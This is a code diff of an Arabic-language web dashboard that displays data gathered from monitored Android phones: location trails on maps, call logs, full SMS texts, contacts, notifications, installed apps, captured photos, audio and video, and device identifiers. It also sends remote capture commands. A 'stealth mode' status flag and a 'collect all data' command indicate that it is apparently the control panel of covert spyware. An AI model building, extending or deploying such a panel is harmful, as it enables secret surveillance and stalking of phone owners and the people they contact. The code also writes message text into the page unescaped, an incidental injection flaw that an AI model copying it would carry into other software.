-  const tabLabels = { overview: 'ملخص', location: 'الموقع', calls: 'المكالمات', sms: 'الرسائل', contacts: 'جهات الاتصال', apps: 'التطبيقات', usage: 'الاستخدام', notifications: 'الإشعارات', media: 'الوسائط', state: 'حالة الجهاز', commands: 'أوامر' };
-
-  let tabsHtml = '<div class="tabs">';
-  for (const t of tabs) {
-    tabsHtml += `<button class="tab ${t === currentTab ? 'active' : ''}" onclick="switchTab('${t}')">${tabLabels[t]}</button>`;
-  }
-  tabsHtml += '</div>';
-
-  document.getElementById('mainContent').innerHTML = tabsHtml + '<div id="tabContent"><div class="spinner" style="margin:40px auto"></div></div>';
-
-  await renderTab(currentTab);
+function selectDevice(serial) {
+  selectedDevice = { device_serial: serial };
+  document.getElementById('mainTitle').innerHTML = serial.slice(0,16);
+  document.getElementById('deviceInfo').textContent = serial;
+  document.querySelectorAll('.device-item').forEach(el => el.classList.remove('active'));
+  const idx = [...document.querySelectorAll('.device-item')].findIndex(el => el.textContent.includes(serial.slice(0,8)));
+  if (idx >= 0) document.querySelectorAll('.device-item')[idx]?.classList.add('active');
+  switchTab('overview');
 }
 
 function switchTab(tab) {
   currentTab = tab;
-  renderTabContent();
+  document.querySelectorAll('.tab').forEach(t => t.classList.toggle('active', t.dataset.tab === tab));
+  renderTab(tab);
 }
+
+function refreshCurrentTab() { if (selectedDevice) renderTab(currentTab); }
 
 async function renderTab(tab) {
   const el = document.getElementById('tabContent');
-  if (!el || !selectedDevice) return;
-
-  switch (tab) {
-    case 'overview': await renderOverview(el); break;
-    case 'location': await renderLocation(el); break;
-    case 'calls': await renderCallLogs(el); break;
-    case 'sms': await renderSms(el); break;
-    case 'contacts': await renderContacts(el); break;
-    case 'apps': await renderApps(el); break;
-    case 'usage': await renderAppUsage(el); break;
-    case 'notifications': await renderNotifications(el); break;
-    case 'media': await renderMedia(el); break;
-    case 'state': await renderDeviceState(el); break;
-    case 'commands': await renderCommands(el); break;
-  }
+  if (!selectedDevice) { el.innerHTML = '<div style="text-align:center;padding:40px;color:#64748b">اختر جهازاً أولاً</div>'; return; }
+  const map = { overview:renderOverview, location:renderLocations, calls:renderCallLogs, sms:renderSms, contacts:renderContacts, apps:renderApps, media:renderMedia, state:renderDeviceState, commands:renderCommands };
+  await (map[tab] || (() => {}))(el);
 }
 
+// ================== OVERVIEW ==================
 async function renderOverview(el) {
-  const d = selectedDevice;
-  const serial = d.device_serial;
-  const [locData, callData, smsData, contactData, appData, notifData, stateData] = await Promise.all([
-    sb.from('location_history').select('*', { count: 'exact', head: true }).eq('device_serial', serial),
-    sb.from('call_logs').select('*', { count: 'exact', head: true }).eq('device_serial', serial),
-    sb.from('sms_messages').select('*', { count: 'exact', head: true }).eq('device_serial', serial),
-    sb.from('contacts').select('*', { count: 'exact', head: true }).eq('device_serial', serial),
-    sb.from('installed_applications').select('*', { count: 'exact', head: true }).eq('device_serial', serial),
-    sb.from('notification_logs').select('*', { count: 'exact', head: true }).eq('device_serial', serial),
-    sb.from('device_state_snapshots').select('captured_at').eq('device_serial', serial).order('captured_at', { ascending: false }).limit(1).maybeSingle()
+  const [locRes, stateRes, notifRes, callRes, smsRes] = await Promise.all([
+    sb.from('location_history').select('*').eq('device_serial', selectedDevice.device_serial).order('captured_at', { ascending: false }).limit(100),
+    sb.from('device_state_snapshots').select('*').eq('device_serial', selectedDevice.device_serial).order('captured_at', { ascending: false }).limit(1),
+    sb.from('notification_logs').select('*').eq('device_serial', selectedDevice.device_serial).order('captured_at', { ascending: false }).limit(5),
+    sb.from('call_logs').select('*').eq('device_serial', selectedDevice.device_serial).order('call_date', { ascending: false }).limit(5),
+    sb.from('sms_messages').select('*').eq('device_serial', selectedDevice.device_serial).order('sms_date', { ascending: false }).limit(5)
   ]);
-
-  const counts = {
-    location: locData.count || 0,
-    calls: callData.count || 0,
-    sms: smsData.count || 0,
-    contacts: contactData.count || 0,
-    apps: appData.count || 0,
-    notifications: notifData.count || 0
-  };
-
-  el.innerHTML = `
-    <!-- Quick Actions -->
-    <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:16px">
-      <button class="btn btn-sm btn-primary" onclick="sendCommand('capture_location')" style="width:auto">📍 تحديث الموقع</button>
-      <button class="btn btn-sm btn-primary" onclick="sendAllCaptureCommands()" style="width:auto;background:#8b5cf6">⚡ جمع كل البيانات</button>
-      <button class="btn btn-sm btn-primary" onclick="sendCommand('sync_now')" style="width:auto;background:#22c55e">🔄 مزامنة فورية</button>
-      <button class="btn btn-sm btn-outline" onclick="switchTab('commands')" style="width:auto">🎮 إرسال أمر</button>
-      <button class="btn btn-sm btn-outline" onclick="refreshDevices()" style="width:auto">⟳ تحديث</button>
-      ${d.is_active === false
-        ? `<button class="btn btn-sm btn-primary" onclick="restoreDevice('${d.device_serial}')" style="width:auto;background:#22c55e">↩ استعادة</button>`
-        : `<button class="btn btn-sm btn-danger" onclick="deleteDevice('${d.device_serial}')" style="width:auto">🗑 حذف</button>`}
+  const locs = locRes.data || [], loc = locs[0], state = stateRes.data?.[0], notifs = notifRes.data || [], calls = callRes.data || [], smsList = smsRes.data || [];
+  el.innerHTML = `<div class="grid-4">
+    <div class="stat-card"><div class="s-icon">📍</div><div class="s-label">آخر موقع</div>
+      <div class="s-value" style="font-size:16px">${loc ? `${loc.latitude?.toFixed(4)}, ${loc.longitude?.toFixed(4)}` : '—'}</div>
+      <div class="s-sub">${loc?.captured_at ? DT(loc.captured_at) : ''}</div>
+      ${loc ? `<a class="loc-link" href="https://www.google.com/maps?q=${loc.latitude},${loc.longitude}" target="_blank" style="margin-top:6px;display:inline-block">فتح في Google Maps</a>` : ''}
+      ${locs.length > 1 ? `<div style="margin-top:6px;font-size:11px;color:#64748b">آخر ${Math.min(locs.length,100)} موقع — <a href="#" onclick="switchTab('location');return false" style="color:#3b82f6">عرض الكل</a></div>` : ''}
     </div>
-    <!-- Device Status -->
-    <div class="grid-4">
-      <div class="card"><div class="card-header"><h3>الحالة</h3></div>
-        <div class="card-value" style="color:${d.is_active ? '#22c55e' : '#ef4444'};font-size:20px">${d.is_active ? '🟢 نشط' : '🔴 موقف'}</div>
-        <div class="card-sub">${d.is_stealth ? '🕵️ وضع مخفي' : '👁️ ظاهر'}</div>
-      </div>
-      <div class="card"><div class="card-header"><h3>آخر ظهور</h3></div>
-        <div class="card-value" style="font-size:16px">${d.last_seen_at ? new Date(d.last_seen_at).toLocaleString('ar-SA') : '—'}</div>
-      </div>
-      <div class="card"><div class="card-header"><h3>الجهاز</h3></div>
-        <div style="font-size:14px;line-height:1.8">${d.manufacturer || '—'} ${d.model || ''}<br>${d.os_version || ''}</div>
-      </div>
-      <div class="card"><div class="card-header"><h3>البيانات</h3></div>
-        <div style="font-size:13px;line-height:2">
-          📍 ${counts.location} موقع · 📞 ${counts.calls} مكالمة<br>
-          💬 ${counts.sms} رسالة · 👤 ${counts.contacts} اتصال<br>
-          📱 ${counts.apps} تطبيق · 🔔 ${counts.notifications} إشعار
-        </div>
-      </div>
+    <div class="stat-card"><div class="s-icon">🔋</div><div class="s-label">البطارية</div>
+      <div class="s-value">${state?.battery_level || 0}%</div>
+      <div class="s-sub">${state?.is_charging ? 'يشحن' : 'بطارية'} · ${state?.network_type || '—'}</div>
+      <div class="battery-bar"><div class="battery-fill" style="width:${state?.battery_level || 0}%;background:${(state?.battery_level||0) > 20 ? (state?.is_charging ? '#22c55e' : '#3b82f6') : '#ef4444'}"></div></div>
     </div>
-    <!-- Quick Links -->
-    <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:16px">
-      <button class="btn btn-sm btn-outline" onclick="switchTab('location')" style="width:auto">📍 الموقع</button>
-      <button class="btn btn-sm btn-outline" onclick="switchTab('calls')" style="width:auto">📞 المكالمات</button>
-      <button class="btn btn-sm btn-outline" onclick="switchTab('sms')" style="width:auto">💬 الرسائل</button>
-      <button class="btn btn-sm btn-outline" onclick="switchTab('contacts')" style="width:auto">👤 جهات الاتصال</button>
-      <button class="btn btn-sm btn-outline" onclick="switchTab('apps')" style="width:auto">📱 التطبيقات</button>
-      <button class="btn btn-sm btn-outline" onclick="switchTab('notifications')" style="width:auto">🔔 الإشعارات</button>
-      <button class="btn btn-sm btn-outline" onclick="switchTab('state')" style="width:auto">🔋 حالة الجهاز</button>
+    <div class="stat-card"><div class="s-icon">💾</div><div class="s-label">التخزين</div>
+      <div class="s-value" style="font-size:16px">${state?.storage_available ? fmt(state.storage_available) : '—'}</div>
+      <div class="s-sub">من ${state?.storage_total ? fmt(state.storage_total) : '—'}</div>
     </div>
-    <div id="cmdResult"></div>
-    <!-- Device Info -->
-    <div class="card"><div class="card-header"><h3>معلومات الجهاز</h3></div>
-      <table class="data-table">
-        <tr><td>Device Serial</td><td>${d.device_serial}</td></tr>
-        <tr><td>الكنية</td><td><input type="text" id="aliasInput" value="${d.alias || ''}" placeholder="اسم مخصص" style="background:#0f172a;border:1px solid #334155;border-radius:6px;padding:4px 8px;color:#e2e8f0;width:200px;font-size:13px"> <button class="btn btn-sm btn-primary" onclick="saveAlias()">حفظ</button></td></tr>
-        <tr><td>Device Token</td><td style="font-family:monospace;font-size:11px;color:#94a3b8">${d.device_token ? d.device_token.substring(0, 20) + '...' : '—'}</td></tr>
-        <tr><td>IMEI</td><td>${d.imei || '—'}</td></tr>
-        <tr><td>MAC (WiFi)</td><td>${d.wifi_mac || '—'}</td></tr>
-        <tr><td>MAC (Bluetooth)</td><td>${d.bluetooth_mac || '—'}</td></tr>
-        <tr><td>آخر IP</td><td>${d.last_ip_address || '—'}</td></tr>
-        <tr><td>تاريخ التسجيل</td><td>${d.enrolled_at ? new Date(d.enrolled_at).toLocaleString('ar-SA') : '—'}</td></tr>
-        <tr><td>Admin Lock</td><td>${d.is_admin_locked ? '🔒 نعم' : '🔓 لا'}</td></tr>
-      </table>
-    </div>`;
+    <div class="stat-card"><div class="s-icon">📡</div><div class="s-label">الشبكة</div>
+      <div class="s-value" style="font-size:16px">${state?.network_type || '—'}</div>
+      <div class="s-sub">${state?.signal_strength ? `الإشارة: ${state.signal_strength}` : ''}</div>
+    </div>
+  </div>`;
+  if (loc) el.innerHTML += `<div class="card"><div class="card-header"><h3>المواقع على الخريطة (${locs.length})</h3><a href="#" onclick="switchTab('location');return false" style="color:#3b82f6;font-size:12px">عرض الكل ←</a></div>
+    <div id="overviewMap" style="height:280px;border-radius:12px"></div></div>`;
+  if (notifs.length) el.innerHTML += `<div class="card"><div class="card-header"><h3>آخر الإشعارات</h3><span class="count">${notifs.length}</span></div>
+    <table class="data-table">${notifs.map(n => `<tr><td style="font-size:12px">${n.app_name||'—'}</td><td style="max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${n.title||'—'}</td><td class="timestamp">${n.captured_at ? DT(n.captured_at) : '—'}</td></tr>`).join('')}</table></div>`;
+  if (calls.length) el.innerHTML += `<div class="card"><div class="card-header"><h3>آخر المكالمات</h3><a href="#" onclick="switchTab('calls');return false" style="color:#3b82f6;font-size:12px">عرض الكل ←</a></div>
+    <table class="data-table">${calls.map(r => `<tr><td style="font-size:12px">${r.phone_number||'—'}</td><td>${r.contact_name||'—'}</td><td>${ctLabel(r.call_type)}</td><td class="timestamp">${r.call_date ? DT(r.call_date) : '—'}</td></tr>`).join('')}</table></div>`;
+  if (smsList.length) el.innerHTML += `<div class="card"><div class="card-header"><h3>آخر الرسائل</h3><a href="#" onclick="switchTab('sms');return false" style="color:#3b82f6;font-size:12px">عرض الكل ←</a></div>
+    <table class="data-table">${smsList.map(r => `<tr><td style="font-size:12px">${r.phone_number||'—'}</td><td class="sms-body" style="max-width:250px">${r.message_body||'—'}</td><td>${mtLabel(r.message_type)}</td><td class="timestamp">${r.sms_date ? DT(r.sms_date) : '—'}</td></tr>`).join('')}</table></div>`;
+  if (loc) setTimeout(() => {
+    if (typeof L !== 'undefined') {
+      const m = L.map('overviewMap').setView([loc.latitude, loc.longitude], 13);
+      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { maxZoom: 19, attribution:'© OSM' }).addTo(m);
+      locs.forEach(r => { if (r.latitude && r.longitude) L.marker([r.latitude, r.longitude]).addTo(m).bindPopup(`<small>${DT(r.captured_at)}<br>${r.latitude?.toFixed(4)}, ${r.longitude?.toFixed(4)}<br>دقة: ${r.accuracy||'?'}م</small>`); });
+      if (locs.length > 1) m.fitBounds(locs.filter(r => r.latitude && r.longitude).map(r => [r.latitude, r.longitude]));
+    }
+  }, 150);
 }
 
-async function renderLocation(el) {
-  const { data } = await sb.from('location_history').select('*').eq('device_serial', selectedDevice.device_serial).order('captured_at', { ascending: false }).limit(100);
-  if (!data || data.length === 0) { el.innerHTML = '<div class="empty-state"><p>ما في بيانات موقع</p></div>'; return; }
-
-  const last = data[0];
-  el.innerHTML = `
-    <div class="grid-4">
-      <div class="card"><div class="card-header"><h3>آخر موقع</h3></div>
-        <div class="card-value" style="font-size:16px">${last.latitude}, ${last.longitude}</div>
-        <div class="card-sub">${last.accuracy ? 'دقة: ' + Math.round(last.accuracy) + 'm' : ''}</div>
-      </div>
-      <div class="card"><div class="card-header"><h3>الارتفاع</h3></div>
-        <div class="card-value">${last.altitude || 0}m</div>
-      </div>
-      <div class="card"><div class="card-header"><h3>السرعة</h3></div>
-        <div class="card-value">${last.speed ? (last.speed * 3.6).toFixed(1) : 0} km/h</div>
-      </div>
-      <div class="card"><div class="card-header"><h3>آخر تحديث</h3></div>
-        <div class="card-value" style="font-size:14px">${last.captured_at ? new Date(last.captured_at).toLocaleString('ar-SA') : '—'}</div>
-      </div>
-    </div>
-    <div id="locationMap" style="height:400px;border-radius:12px;margin-bottom:20px;border:1px solid #334155;background:#1e293b"></div>
-    <div class="card"><div class="card-header"><h3>سجل المواقع (آخر 100)</h3></div>
-      <table class="data-table">
-        <tr><th>التاريخ</th><th>خط العرض</th><th>خط الطول</th><th>الدقة</th><th>السرعة</th></tr>
-        ${data.slice(0, 20).map(r => `<tr>
-          <td class="timestamp">${r.captured_at ? new Date(r.captured_at).toLocaleString('ar-SA') : '—'}</td>
-          <td>${r.latitude}</td><td>${r.longitude}</td>
-          <td>${r.accuracy ? Math.round(r.accuracy) + 'm' : '—'}</td>
-          <td>${r.speed ? (r.speed * 3.6).toFixed(1) + ' km/h' : '—'}</td>
-        </tr>`).join('')}
-      </table>
-    </div>`;
-
+// ================== LOCATIONS ==================
+async function renderLocations(el) {
+  const { data } = await sb.from('location_history').select('*').eq('device_serial', selectedDevice.device_serial).order('captured_at', { ascending: false }).limit(200);
+  if (!data || !data.length) { el.innerHTML = '<div class="card" style="text-align:center;padding:40px;color:#64748b">لا توجد بيانات موقع</div>'; return; }
+  el.innerHTML = `<div class="card"><div class="card-header"><h3>جميع المواقع (${data.length})</h3></div>
+    <div id="allLocationsMap" style="height:300px;border-radius:12px;margin-bottom:16px"></div>
+    <table class="data-table"><tr><th>#</th><th>الإحداثيات</th><th>الدقة</th><th>السرعة</th><th>الوقت</th><th></th></tr>
+    ${data.map((r,i) => `<tr>
+      <td style="color:#64748b">${data.length - i}</td>
+      <td style="font-family:monospace;font-size:11px">${r.latitude?.toFixed(6)}, ${r.longitude?.toFixed(6)}</td>
+      <td>${r.accuracy ? r.accuracy + 'م' : '—'}</td>
+      <td>${r.speed ? r.speed + 'م/ث' : '—'}</td>
+      <td class="timestamp">${DT(r.captured_at)}</td>
+      <td><a class="loc-link" href="https://www.google.com/maps?q=${r.latitude},${r.longitude}" target="_blank" title="فتح في Google Maps">فتح ←</a></td>
+    </tr>`).join('')}
+    </table></div>`;
   setTimeout(() => {
-    const mapEl = document.getElementById('locationMap');
-    if (!mapEl || typeof L === 'undefined') return;
-    const map = L.map(mapEl, { zoomControl: true }).setView([last.latitude, last.longitude], 15);
-    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { maxZoom: 19 }).addTo(map);
-    const points = data.filter(r => r.latitude && r.longitude).reverse();
-    if (points.length > 0) {
-      const latlngs = points.map(r => [r.latitude, r.longitude]);
-      L.polyline(latlngs, { color: '#3b82f6', weight: 3, opacity: 0.6 }).addTo(map);
-      L.marker(latlngs[latlngs.length - 1]).addTo(map).bindPopup('آخر موقع').openPopup();
+    if (typeof L !== 'undefined') {
+      const m = L.map('allLocationsMap').setView([data[0].latitude, data[0].longitude], 13);
+      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { maxZoom: 19, attribution:'© OSM' }).addTo(m);
+      data.forEach(r => { if (r.latitude && r.longitude) L.marker([r.latitude, r.longitude]).addTo(m).bindPopup(`<small>${DT(r.captured_at)}<br>${r.latitude?.toFixed(4)}, ${r.longitude?.toFixed(4)}</small>`); });
+      if (data.length > 1) m.fitBounds(data.filter(r => r.latitude && r.longitude).map(r => [r.latitude, r.longitude]));
     }
-    setTimeout(() => map.invalidateSize(), 300);
   }, 100);
 }
 
+// ================== CALL LOGS ==================
 async function renderCallLogs(el) {
-  const { data } = await sb.from('call_logs').select('*').eq('device_serial', selectedDevice.device_serial).order('call_date', { ascending: false }).limit(100);
-  if (!data || data.length === 0) { el.innerHTML = '<div class="empty-state"><p>ما في سجل مكالمات</p></div>'; return; }
-  el.innerHTML = `<div class="card"><table class="data-table">
-    <tr><th>التاريخ</th><th>الرقم</th><th>الاسم</th><th>النوع</th><th>المدة</th></tr>
-    ${data.map(r => `<tr>
-      <td class="timestamp">${r.call_date ? new Date(r.call_date).toLocaleString('ar-SA') : '—'}</td>
-      <td class="${r.phone_number && r.phone_number.includes('Encrypted') ? 'encrypted' : ''}">${r.phone_number || '—'}</td>
-      <td class="${r.contact_name && r.contact_name.includes('Encrypted') ? 'encrypted' : ''}">${r.contact_name || '—'}</td>
-      <td>${r.call_type === '1' ? 'وارد' : r.call_type === '2' ? 'صادر' : r.call_type === '3' ? 'فائت' : r.call_type}</td>
-      <td>${r.duration_seconds ? Math.floor(r.duration_seconds / 60) + ':' + (r.duration_seconds % 60).toString().padStart(2, '0') : '—'}</td>
+  const { data } = await sb.from('call_logs').select('*').eq('device_serial', selectedDevice.device_serial).order('call_date', { ascending: false }).limit(500);
+  if (!data || !data.length) { el.innerHTML = '<div class="card" style="text-align:center;padding:40px;color:#64748b">لا توجد مكالمات</div>'; return; }
+  const incoming = data.filter(r => ctNum(r.call_type) === 1).length, outgoing = data.filter(r => ctNum(r.call_type) === 2).length, missed = data.filter(r => ctNum(r.call_type) === 3).length;
+  el.innerHTML = `<div class="grid-3" style="margin-bottom:0">
+    <div class="stat-card"><div class="s-label">وارد</div><div class="s-value" style="color:#22c55e">${incoming}</div></div>
+    <div class="stat-card"><div class="s-label">صادر</div><div class="s-value" style="color:#3b82f6">${outgoing}</div></div>
+    <div class="stat-card"><div class="s-label">فائت</div><div class="s-value" style="color:#ef4444">${missed}</div></div>
+  </div>
+  <div class="card"><div class="card-header"><h3>سجل المكالمات (${data.length})</h3></div>
+    <table class="data-table"><tr><th>الرقم</th><th>الاسم</th><th>النوع</th><th>المدة</th><th>التاريخ</th></tr>
+    ${data.slice(0,200).map(r => `<tr>
+      <td dir="ltr" style="font-size:12px">${r.phone_number||'—'}</td>
+      <td>${r.contact_name||'—'}</td>
+      <td>${ctLabel(r.call_type)}</td>
+      <td>${r.duration_seconds ? Math.floor(r.duration_seconds/60)+'د '+r.duration_seconds%60+'ث' : '—'}</td>
+      <td class="timestamp">${r.call_date ? DT(r.call_date) : '—'}</td>
     </tr>`).join('')}
-  </table></div>`;
+    </table>
+    ${data.length > 200 ? `<div style="text-align:center;padding:10px;color:#64748b;font-size:12px">و ${data.length - 200} إضافية</div>` : ''}</div>`;
 }
 
+// ================== SMS ==================
 async function renderSms(el) {
-  const { data } = await sb.from('sms_messages').select('*').eq('device_serial', selectedDevice.device_serial).order('sms_date', { ascending: false }).limit(100);
-  if (!data || data.length === 0) { el.innerHTML = '<div class="empty-state"><p>ما في رسائل SMS</p></div>'; return; }
-  el.innerHTML = `<div class="card"><table class="data-table">
-    <tr><th>التاريخ</th><th>الرقم</th><th>النص</th><th>النوع</th></tr>
-    ${data.map(r => `<tr>
-      <td class="timestamp">${r.sms_date ? new Date(r.sms_date).toLocaleString('ar-SA') : '—'}</td>
-      <td class="${r.phone_number && r.phone_number.includes('Encrypted') ? 'encrypted' : ''}">${r.phone_number || '—'}</td>
-      <td style="max-width:300px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" class="${r.message_body && r.message_body.includes('Encrypted') ? 'encrypted' : ''}">${r.message_body || '—'}</td>
-      <td>${r.message_type === '1' ? 'وارد' : r.message_type === '2' ? 'صادر' : r.message_type}</td>
+  const { data } = await sb.from('sms_messages').select('*').eq('device_serial', selectedDevice.device_serial).order('sms_date', { ascending: false }).limit(500);
+  if (!data || !data.length) { el.innerHTML = '<div class="card" style="text-align:center;padding:40px;color:#64748b">لا توجد رسائل</div>'; return; }
+  const inbox = data.filter(r => mtNum(r.message_type) === 1).length, sent = data.filter(r => mtNum(r.message_type) === 2).length;
+  el.innerHTML = `<div class="grid-2" style="margin-bottom:0">
+    <div class="stat-card"><div class="s-label">وارد</div><div class="s-value" style="color:#22c55e">${inbox}</div></div>
+    <div class="stat-card"><div class="s-label">مرسل</div><div class="s-value" style="color:#3b82f6">${sent}</div></div>
+  </div>
+  <div class="card"><div class="card-header"><h3>الرسائل (${data.length})</h3></div>
+    <table class="data-table"><tr><th>الرقم</th><th>النص</th><th>النوع</th><th>التاريخ</th></tr>
+    ${data.slice(0,200).map(r => `<tr>
+      <td dir="ltr" style="font-size:12px">${r.phone_number||'—'}</td>
+      <td class="sms-body">${r.message_body||'—'}</td>
+      <td>${mtLabel(r.message_type)}</td>
+      <td class="timestamp">${r.sms_date ? DT(r.sms_date) : '—'}</td>
     </tr>`).join('')}
-  </table></div>`;
+    </table>
+    ${data.length > 200 ? `<div style="text-align:center;padding:10px;color:#64748b;font-size:12px">و ${data.length - 200} إضافية</div>` : ''}</div>`;
 }
 
+// ================== CONTACTS ==================
 async function renderContacts(el) {
-  const { data } = await sb.from('contacts').select('*').eq('device_serial', selectedDevice.device_serial).limit(200);
-  if (!data || data.length === 0) { el.innerHTML = '<div class="empty-state"><p>ما في جهات اتصال</p></div>'; return; }
-  function formatPhones(phones) {
-    if (!phones) return '—';
-    try { const arr = typeof phones === 'string' ? JSON.parse(phones) : phones; return Array.isArray(arr) ? arr.join(' · ') : '—'; } catch { return '—'; }
-  }
-  function formatEmails(emails) {
-    if (!emails) return '—';
-    try { const arr = typeof emails === 'string' ? JSON.parse(emails) : emails; return Array.isArray(arr) ? arr.join(', ') : '—'; } catch { return '—'; }
-  }
-  el.innerHTML = `<div class="card"><div class="card-header"><h3>جهات الاتصال (${data.length})</h3></div>
-    <table class="data-table">
-    <tr><th>الاسم</th><th>رقم الهاتف</th><th>البريد</th><th>الوظيفة</th></tr>
-    ${data.map(r => `<tr>
-      <td>${r.display_name || '—'}</td>
-      <td style="direction:ltr;text-align:right">${formatPhones(r.phone_numbers)}</td>
-      <td>${formatEmails(r.emails)}</td>
-      <td>${[r.organization, r.job_title].filter(Boolean).join(' - ') || '—'}</td>
-    </tr>`).join('')}
-  </table></div>`;
+  const { data } = await sb.from('contacts').select('*').eq('device_serial', selectedDevice.device_serial).order('display_name', { ascending: true }).limit(1000);
+  if (!data || !data.length) { el.innerHTML = '<div class="card" style="text-align:center;padding:40px;color:#64748b">لا توجد جهات اتصال</div>'; return; }
+  el.innerHTML = `<div class="card"><div class="card-header"><h3>جهات الاتصال (${data.length})</h3>
+    <input type="text" class="filter-input" placeholder="بحث..." oninput="filterTable('contactsTable',this.value)"></div>
+    <table class="data-table" id="contactsTable"><tr><th>الاسم</th><th>رقم الهاتف</th><th>البريد</th><th>الشركة</th></tr>
+    ${data.map(r => `<tr class="ftr"><td><strong>${r.display_name||'—'}</strong></td><td dir="ltr" style="font-size:12px">${r.phone_numbers||'—'}</td><td style="font-size:12px">${r.emails||'—'}</td><td style="font-size:12px">${r.organization||'—'}</td></tr>`).join('')}
+    </table></div>`;
 }
 
+function filterTable(id, q) {
+  document.querySelectorAll(`#${id} .ftr`).forEach(r => r.style.display = r.textContent.toLowerCase().includes(q.toLowerCase()) ? '' : 'none');
+}
+
+// ================== APPS ==================
 async function renderApps(el) {
-  const { data } = await sb.from('installed_applications').select('*').eq('device_serial', selectedDevice.device_serial).order('app_name').limit(100);
-  if (!data || data.length === 0) { el.innerHTML = '<div class="empty-state"><p>ما في تطبيقات</p></div>'; return; }
-  el.innerHTML = `<div class="card"><div class="card-header"><h3>التطبيقات المثبتة (${data.length})</h3></div>
-    <table class="data-table">
-    <tr><th>التطبيق</th><th>الحزمة</th><th>الإصدار</th><th>نظامي</th></tr>
-    ${data.map(r => `<tr>
-      <td class="${r.app_name && r.app_name.includes('Encrypted') ? 'encrypted' : ''}">${r.app_name || '—'}</td>
-      <td class="${r.package_name && r.package_name.includes('Encrypted') ? 'encrypted' : ''}" style="font-family:monospace;font-size:11px">${r.package_name || '—'}</td>
-      <td>${r.version_name || ''} (${r.version_code || ''})</td>
-      <td>${r.is_system_app ? 'نعم' : 'لا'}</td>
-    </tr>`).join('')}
-  </table></div>`;
+  const { data } = await sb.from('installed_applications').select('*').eq('device_serial', selectedDevice.device_serial).order('captured_at', { ascending: false }).limit(500);
+  if (!data || !data.length) { el.innerHTML = '<div class="card" style="text-align:center;padding:40px;color:#64748b">لا توجد تطبيقات</div>'; return; }
+  const sys = data.filter(r => r.is_system_app).length, user = data.filter(r => !r.is_system_app).length;
+  el.innerHTML = `<div class="grid-2" style="margin-bottom:0">
+    <div class="stat-card"><div class="s-label">تطبيقات المستخدم</div><div class="s-value" style="color:#22c55e">${user}</div></div>
+    <div class="stat-card"><div class="s-label">تطبيقات النظام</div><div class="s-value" style="color:#64748b">${sys}</div></div>
+  </div>
+  <div class="card"><div class="card-header"><h3>التطبيقات المثبتة (${data.length})</h3>
+    <input type="text" class="filter-input" placeholder="بحث..." oninput="filterTable('appsTable',this.value)"></div>
+    <table class="data-table" id="appsTable"><tr><th>التطبيق</th><th>الحزمة</th><th>الإصدار</th><th>النوع</th></tr>
+    ${data.map(r => `<tr class="ftr"><td>${r.app_name||'—'}</td><td style="font-family:monospace;font-size:11px">${r.package_name||'—'}</td><td>${r.version_name||'—'}</td><td>${r.is_system_app ? 'نظام' : 'مستخدم'}</td></tr>`).join('')}
+    </table></div>`;
 }
 
-async function renderAppUsage(el) {
-  const { data } = await sb.from('app_usage_stats').select('*').eq('device_serial', selectedDevice.device_serial).order('usage_date', { ascending: false }).limit(100);
-  if (!data || data.length === 0) { el.innerHTML = '<div class="empty-state"><p>ما في بيانات استخدام</p></div>'; return; }
-  el.innerHTML = `<div class="card"><div class="card-header"><h3>إحصائيات استخدام التطبيقات (${data.length})</h3></div>
-    <table class="data-table">
-    <tr><th>التاريخ</th><th>التطبيق</th><th>مدة الاستخدام</th><th>آخر استخدام</th></tr>
-    ${data.map(r => `<tr>
-      <td class="timestamp">${r.usage_date ? new Date(r.usage_date).toLocaleDateString('ar-SA') : '—'}</td>
-      <td>${r.app_name || r.package_name || '—'}</td>
-      <td>${r.foreground_time_seconds ? Math.floor(r.foreground_time_seconds / 60) + ' دقيقة' : '—'}</td>
-      <td class="timestamp">${r.last_used_at ? new Date(r.last_used_at).toLocaleString('ar-SA') : '—'}</td>
-    </tr>`).join('')}
-  </table></div>`;
-}
-
-async function renderNotifications(el) {
-  const { data } = await sb.from('notification_logs').select('*').eq('device_serial', selectedDevice.device_serial).order('posted_at', { ascending: false }).limit(100);
-  if (!data || data.length === 0) { el.innerHTML = '<div class="empty-state"><p>ما في إشعارات</p></div>'; return; }
-  el.innerHTML = `<div class="card"><div class="card-header"><h3>الإشعارات (${data.length})</h3></div>
-    <table class="data-table">
-    <tr><th>التاريخ</th><th>التطبيق</th><th>العنوان</th><th>النص</th></tr>
-    ${data.map(r => `<tr>
-      <td class="timestamp">${r.posted_at ? new Date(r.posted_at).toLocaleString('ar-SA') : '—'}</td>
-      <td>${r.app_name || r.package_name || '—'}</td>
-      <td style="font-weight:600">${r.title || '—'}</td>
-      <td style="max-width:300px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${r.body || '—'}</td>
-    </tr>`).join('')}
-  </table></div>`;
-}
-
+// ================== MEDIA ==================
 async function renderMedia(el) {
   const { data } = await sb.from('media_captures').select('*').eq('device_serial', selectedDevice.device_serial).order('captured_at', { ascending: false }).limit(50);
-  if (!data || data.length === 0) { el.innerHTML = '<div class="empty-state"><p>ما في وسائط</p></div>'; return; }
+  if (!data || !data.length) { el.innerHTML = '<div class="card" style="text-align:center;padding:40px;color:#64748b">لا توجد وسائط</div>'; return; }
   el.innerHTML = `<div class="card"><div class="card-header"><h3>الوسائط الملتقطة (${data.length})</h3></div>
-    <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:12px">
-    ${data.map(r => {
-      const isImage = r.mime_type?.startsWith('image/');
-      const isAudio = r.mime_type?.startsWith('audio/');
-      const isVideo = r.mime_type?.startsWith('video/');
-      return `<div style="background:#0f172a;border-radius:8px;padding:12px;border:1px solid #334155">
-        ${isImage ? `<img src="${r.file_url}" style="width:100%;height:140px;object-fit:cover;border-radius:6px;margin-bottom:8px" loading="lazy">` : ''}
-        ${isAudio ? `<audio controls style="width:100%;margin-bottom:8px"><source src="${r.file_url}"></audio>` : ''}
-        ${isVideo ? `<video controls style="width:100%;height:140px;object-fit:cover;border-radius:6px;margin-bottom:8px"><source src="${r.file_url}"></video>` : ''}
-        <div style="font-size:12px;color:#94a3b8">${r.media_type || '—'} · ${r.file_size_bytes ? formatBytes(r.file_size_bytes) : '—'}</div>
